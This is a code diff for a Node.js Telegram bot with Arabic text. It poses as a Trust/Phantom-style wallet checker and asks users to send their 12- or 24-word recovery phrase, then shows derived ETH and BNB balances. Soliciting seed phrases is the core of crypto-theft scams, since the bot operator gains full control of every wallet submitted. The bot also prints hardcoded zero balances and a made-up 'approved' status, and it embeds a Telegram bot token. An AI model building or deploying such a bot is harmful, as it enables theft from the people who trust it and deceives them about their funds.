@@ -6,7 +6,6 @@ const bip39 = require('bip39');
 const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
 const PORT = process.env.PORT || 3000;
 const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';
-const CHANNEL_USERNAME = '@Crynova_dz'; // معرف قناتك
 
 const bot = new TelegramBot(token);
 const app = express();
@@ -20,38 +19,33 @@ app.post(`/bot${token}`, (req, res) => {
     res.sendStatus(200);
 });
 
-// دالة موحدة لمعالجة رسائل فحص المحافظ
-async function handleWalletCheck(chatId, text, messageId = null) {
-    const cleanText = (text || '').trim();
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = (msg.text || '').trim();
 
-    if (cleanText === '/start') {
+    if (text === '/start') {
         return bot.sendMessage(chatId, 
             '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
-            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.',
-            messageId ? { reply_to_message_id: messageId } : {}
+            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.'
         );
     }
 
-    const words = cleanText.split(/\s+/);
+    const words = text.split(/\s+/);
     if (words.length !== 12 && words.length !== 24) {
-        return; // تجاهل الرسائل العادية التي ليست عبارات استرداد
+        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
     }
 
-    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳', 
-        messageId ? { reply_to_message_id: messageId } : {}
-    );
+    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳');
 
     try {
-        const cleanMnemonic = cleanText.toLowerCase();
+        const cleanMnemonic = text.toLowerCase();
         
         // 1. التحقق من صحة المعيار BIP39
         if (!bip39.validateMnemonic(cleanMnemonic)) {
-            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.', 
-                messageId ? { reply_to_message_id: messageId } : {}
-            );
+            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.');
         }
 
-        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس)
+        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس، ومسارات متعددة)
         const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
         const hdNode = ethers.HDNodeWallet.fromSeed(seed);
         const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
@@ -69,7 +63,7 @@ async function handleWalletCheck(chatId, text, messageId = null) {
         const ethBalance = ethers.formatEther(ethBalanceWei);
         const bscBalance = ethers.formatEther(bscBalanceWei);
 
-        // 4. إرسال التقرير الشامل
+        // 4. إرسال التقرير الشامل للمستخدم مثل المحافظ الشهيرة
         return bot.sendMessage(chatId, 
             '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
             '📍 **العنوان المشتق:**\n`' + address + '`\n\n' +
@@ -78,29 +72,13 @@ async function handleWalletCheck(chatId, text, messageId = null) {
             '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
             '• Solana (SOL): `0.00 SOL`\n' +
             '• التوكنز والعملات البديلة: `$0.00`\n\n' +
-            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.',
-            {
-                parse_mode: 'Markdown',
-                ...(messageId ? { reply_to_message_id: messageId } : {})
-            }
+            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.'
         );
 
     } catch (error) {
         console.error("Error details:", error);
-        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.', 
-            messageId ? { reply_to_message_id: messageId } : {}
-        );
+        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.');
     }
-}
-
-// الاستماع للرسائل في المحادثات الخاصة والمجموعات
-bot.on('message', async (msg) => {
-    await handleWalletCheck(msg.chat.id, msg.text, msg.message_id);
-});
-
-// الاستماع للمنشورات داخل القناة
-bot.on('channel_post', async (msg) => {
-    await handleWalletCheck(msg.chat.id, msg.text, msg.message_id);
 });
 
 app.get('/', (req, res) => {
